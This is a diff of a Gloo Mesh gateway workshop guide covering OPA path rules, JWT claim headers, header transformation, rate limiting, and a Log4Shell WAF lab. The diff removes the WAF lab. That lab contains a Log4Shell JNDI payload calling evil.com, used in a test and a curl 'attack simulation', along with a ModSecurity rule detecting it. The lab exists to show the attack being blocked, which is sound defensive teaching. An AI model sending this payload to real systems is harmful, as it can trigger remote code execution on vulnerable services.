+
+### Enforce paths with OPA
+Let's continue to expand on our example by enforcing a specified path for our users
+
+Here we will modify our rego rule so that users with the `sub` claim containing `@solo.io` can access the `/get` endpoint as well as any path with the prefix `/anything`, while users with the `email` claim containing `@solo.io` can only access specifically the `/anything/protected` endpoint
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: httpbin-opa
+  namespace: httpbin
+data:
+  policy.rego: |-
+    package test
+
+    default allow = false
+
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
+        endswith(payload["sub"], "@solo.io")
+        any({input.http_request.path == "/get",
+        startswith(input.http_request.path, "/anything")
+    })
+        any({input.http_request.method == "GET",
+             input.http_request.method == "POST",
+             input.http_request.method == "PUT",
+             input.http_request.method == "DELETE",
+    })
+    }
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
+        endswith(payload["email"], "@solo.io")
+        input.http_request.path == "/anything/protected"
+        any({input.http_request.method == "GET",
+             input.http_request.method == "POST",
+             input.http_request.method == "PUT",
+             input.http_request.method == "DELETE",
+    })
+    }
+EOF
+```
+If you refresh the browser where the `@solo.io` user is logged in, we should be able to access the `/get` endpoint as well as any path with the prefix `/anything`. Try and access `/anything/foo` for example - it should work.
+
+If you refresh the browser where the `@solo.io` user is logged in, we should now see a `403 Error - You don't have authorization to view this page` if you access anything other than the `/anything/protected` endpoint
+
+### cleanup extauthpolicy for next labs
+In the next labs we will explore using `JWTPolicy` to extract validated claims into new arbitrary headers and configure our OPA to leverage them. For now, we can remove the `httpbin-opa` policy to validate behavior before reimplementing it.
+```
+kubectl --context ${MGMT} -n httpbin delete ExtAuthPolicy httpbin-opa
+```
 
 This diagram shows the flow of the request (with the Istio ingress gateway leveraging the `extauth` Pod to authorize the request):
 
 ![Gloo Mesh Gateway Extauth](images/steps/gateway-extauth-oauth/gloo-mesh-gateway-extauth.svg)
 
 
+## Lab 14 - Apply rate limiting to the Gateway <a name="lab-14---apply-rate-limiting-to-the-gateway-"></a>
 
-## Lab 14 - Use the JWT filter to create headers from claims <a name="lab-14---use-the-jwt-filter-to-create-headers-from-claims-"></a>
+In this lab, lets explore adding rate limiting to our httpbin route
 
-
-In this step, we're going to validate the JWT token and to create a new header from the `email` claim.
-
-Keycloak is running outside of the Service Mesh, so we need to define an `ExternalService` and its associated `ExternalEndpoint`:
-
-Let's start by the latter:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: ExternalEndpoint
-metadata:
-  name: keycloak
-  namespace: httpbin
-  labels:
-    host: keycloak
-spec:
-  address: ${HOST_KEYCLOAK}
-  ports:
-  - name: http
-    number: ${PORT_KEYCLOAK}
-EOF
-```
-
-Then we can create the former:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: ExternalService
-metadata:
-  name: keycloak
-  namespace: httpbin
-  labels:
-    expose: "true"
-spec:
-  hosts:
-  - keycloak
-  ports:
-  - name: http
-    number: ${PORT_KEYCLOAK}
-    protocol: HTTP
-  selector:
-    host: keycloak
-EOF
-```
-
-Now, we can create a `JWTPolicy` to extract the claim.
-
-Create the policy:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: security.policy.gloo.solo.io/v2
-kind: JWTPolicy
-metadata:
-  name: httpbin
-  namespace: httpbin
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        oauth: "true"
-  config:
-    phase:
-      postAuthz:
-        priority: 1
-    providers:
-      keycloak:
-        issuer: ${KEYCLOAK_URL}/realms/master
-        tokenSource:
-          headers:
-          - name: jwt
-        remote:
-          url: ${KEYCLOAK_URL}/realms/master/protocol/openid-connect/certs
-          destinationRef:
-            kind: EXTERNAL_SERVICE
-            ref:
-              name: keycloak
-            port:
-              number: ${PORT_KEYCLOAK}
-        claimsToHeaders:
-        - claim: email
-          header: X-Email
-EOF
-```
-
-You can see that it will be applied to our existing route and also that we want to execute it after performing the external authentication (to have access to the JWT token).
-
-If you refresh the web page, you should see a new `X-Email` header added to the request with the value `user2@solo.io`
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Claim to header is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The new header has been added', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Email": "user2@solo.io"' }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/apps/httpbin/gateway-jwt/tests/header-added.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-
-
-## Lab 15 - Use the transformation filter to manipulate headers <a name="lab-15---use-the-transformation-filter-to-manipulate-headers-"></a>
-
-
-In this step, we're going to use a regular expression to extract a part of an existing header and to create a new one:
-
-Let's create a `TransformationPolicy` to extract the claim.
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: trafficcontrol.policy.gloo.solo.io/v2
-kind: TransformationPolicy
-metadata:
-  name: modify-header
-  namespace: httpbin
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        oauth: "true"
-  config:
-    phase:
-      postAuthz:
-        priority: 2
-    request:
-      injaTemplate:
-        extractors:
-          organization:
-            header: 'X-Email'
-            regex: '.*@(.*)$'
-            subgroup: 1
-        headers:
-          x-organization:
-            text: "{{ organization }}"
-EOF
-```
-
-You can see that it will be applied to our existing route and also that we want to execute it after performing the external authentication (to have access to the JWT token).
-
-If you refresh the web page, you should see a new `X-Organization` header added to the request with the value `solo.io`
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Tranformation is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The new header has been added', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Organization": "solo.io"' }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/apps/httpbin/gateway-transformation/tests/header-added.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-
-
-## Lab 16 - Apply rate limiting to the Gateway <a name="lab-16---apply-rate-limiting-to-the-gateway-"></a>
-
-
-In this step, we're going to apply rate limiting to the Gateway to only allow 3 requests per minute for the users of the `solo.io` organization.
+In this step, we're going to apply rate limiting to the Gateway to only allow 5 requests per minute
 
 First, we need to create a `RateLimitClientConfig` object to define the descriptors:
 
 ```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: trafficcontrol.policy.gloo.solo.io/v2
 kind: RateLimitClientConfig
 metadata:
+  labels:
+    workspace.solo.io/exported: "true"
   name: httpbin
   namespace: httpbin
 spec:
   raw:
     rateLimits:
-    - setActions:
-      - requestHeaders:
-          descriptorKey: organization
-          headerName: X-Organization
+    - actions:
+      - genericKey:
+          descriptorValue: "per-minute"
+      - remoteAddress: {}
 EOF
 ```
 
 Then, we need to create a `RateLimitServerConfig` object to define the limits based on the descriptors:
 
 ```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: admin.gloo.solo.io/v2
 kind: RateLimitServerConfig
 metadata:
+  labels:
+    workspace.solo.io/exported: "true"
   name: httpbin
-  namespace: httpbin
+  namespace: gloo-mesh-addons
 spec:
   destinationServers:
-  - ref:
+  - port:
+      name: grpc
+    ref:
       cluster: cluster1
       name: rate-limiter
       namespace: gloo-mesh-addons
-    port:
-      name: grpc
   raw:
-    setDescriptors:
-      - simpleDescriptors:
-          - key: organization
-            value: solo.io
-        rateLimit:
-          requestsPerUnit: 3
-          unit: MINUTE
+    descriptors:
+      - key: generic_key
+        value: "per-minute"
+        descriptors:
+          - key: remote_address
+            rateLimit:
+              requestsPerUnit: 5
+              unit: MINUTE
 EOF
 ```
 
 After that, we need to create a `RateLimitPolicy` object to define the descriptors:
 
 ```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: trafficcontrol.policy.gloo.solo.io/v2
 kind: RateLimitPolicy
 metadata:
+  labels:
+    workspace.solo.io/exported: "true"
   name: httpbin
   namespace: httpbin
 spec:
@@ -2032,41 +1726,40 @@ spec:
       labels:
         ratelimited: "true"
   config:
+    ratelimitClientConfig:
+      cluster: cluster1
+      name: httpbin
+      namespace: httpbin
+    ratelimitServerConfig:
+      cluster: cluster1
+      name: httpbin
+      namespace: gloo-mesh-addons
     serverSettings:
+      cluster: cluster1
       name: rate-limit-server
       namespace: httpbin
-      cluster: cluster1
-    ratelimitClientConfig:
-      name: httpbin
-      namespace: httpbin
-      cluster: cluster1
-    ratelimitServerConfig:
-      name: httpbin
-      namespace: httpbin
-      cluster: cluster1
-    phase:
-      postAuthz:
-        priority: 3
 EOF
 ```
 
 We also need to create a `RateLimitServerSettings`, which is a CRD that define which extauth server to use: 
 
 ```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: admin.gloo.solo.io/v2
 kind: RateLimitServerSettings
 metadata:
+  labels:
+    workspace.solo.io/exported: "true"
   name: rate-limit-server
   namespace: httpbin
 spec:
   destinationServer:
+    port:
+      name: grpc
     ref:
       cluster: cluster1
       name: rate-limiter
       namespace: gloo-mesh-addons
-    port:
-      name: grpc
 EOF
 ```
 
@@ -2079,19 +1772,28 @@ kind: RouteTable
 metadata:
   name: httpbin
   namespace: httpbin
-  labels:
-    expose: "true"
 spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
   http:
-    - name: httpbin
+    - name: httpbin-all
       labels:
-        oauth: "true"
+        route_name: "httpbin-all"
         ratelimited: "true"
       matchers:
       - uri:
           exact: /get
       - uri:
+          prefix: /anything
+      - uri:
           prefix: /callback
+      - uri:
+          prefix: /logout
       forwardTo:
         destinations:
         - ref:
@@ -2102,38 +1804,15 @@ spec:
 EOF
 ```
 
-Refresh the web page multiple times.
+Refresh the web page multiple times. You should see a 429 error after 5 refreshes
 
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Rate limiting is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 429 }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/apps/httpbin/gateway-ratelimiting/tests/rate-limited.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-You should get a `200` response code the first 3 time and a `429` response code after.
 
 This diagram shows the flow of the request (with the Istio ingress gateway leveraging the `rate limiter` Pod to determine if the request should be allowed):
 
 ![Gloo Mesh Gateway Rate Limiting](images/steps/gateway-ratelimiting/gloo-mesh-gateway-rate-limiting.svg)
+
+
+### cleanup
 
 Let's apply the original `RouteTable` yaml:
 
@@ -2169,153 +1848,6 @@ kubectl --context ${CLUSTER1} -n httpbin delete ratelimitpolicy httpbin
 kubectl --context ${CLUSTER1} -n httpbin delete ratelimitclientconfig httpbin
 kubectl --context ${CLUSTER1} -n httpbin delete ratelimitserverconfig httpbin
 kubectl --context ${CLUSTER1} -n httpbin delete ratelimitserversettings rate-limit-server
-```
-
-
-
-
-## Lab 17 - Use the Web Application Firewall filter <a name="lab-17---use-the-web-application-firewall-filter-"></a>
-
-
-A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
-
-Gloo Mesh includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 
-
-An example of how using Gloo Mesh we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
-
-The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 
-
-Using the Web Application Firewall capabilities you can reject requests containing such headers. 
-
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
-
-Create the WAF policy:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<'EOF'
-apiVersion: security.policy.gloo.solo.io/v2
-kind: WAFPolicy
-metadata:
-  name: log4shell
-  namespace: httpbin
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        waf: "true"
-  config:
-    disableCoreRuleSet: true
-    customInterventionMessage: 'Log4Shell malicious payload'
-    customRuleSets:
-    - ruleStr: |
-        SecRuleEngine On
-        SecRequestBodyAccess On
-        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
-          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
-          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
-EOF
-```
-
-In this example, we're going to update the main `RouteTable` to enforce this policy for all the applications exposed through the gateway (in any workspace).
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: main
-  namespace: istio-gateways
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: istio-gateways
-      cluster: cluster1
-  workloadSelectors: []
-  http:
-    - name: root
-      labels:
-        waf: "true"
-      matchers:
-      - uri:
-          prefix: /
-      delegate:
-        routeTables:
-          - labels:
-              expose: "true"
-EOF
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("WAF is working properly", function() {
-  it('The request has been blocked', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-gateway/build/templates/steps/apps/httpbin/gateway-waf/tests/waf.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
-
-Run the following command to simulate an attack:
-
-```bash
-curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/get" -i
-```
-
-The request should be rejected:
-
-```,nocopy
-HTTP/2 403 
-content-length: 27
-content-type: text/plain
-date: Tue, 05 Apr 2022 10:20:06 GMT
-server: istio-envoy
-
-Log4Shell malicious payload
-```
-
-Let's apply the original `RouteTable` yaml:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: main
-  namespace: istio-gateways
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: istio-gateways
-      cluster: cluster1
-  workloadSelectors: []
-  http:
-    - name: root
-      matchers:
-      - uri:
-          prefix: /
-      delegate:
-        routeTables:
-          - labels:
-              expose: "true"
-EOF
-```
-
-And also delete the waf policy we've created:
-
-```bash
-kubectl --context ${CLUSTER1} -n httpbin delete wafpolicies.security.policy.gloo.solo.io log4shell
 ```
 
 
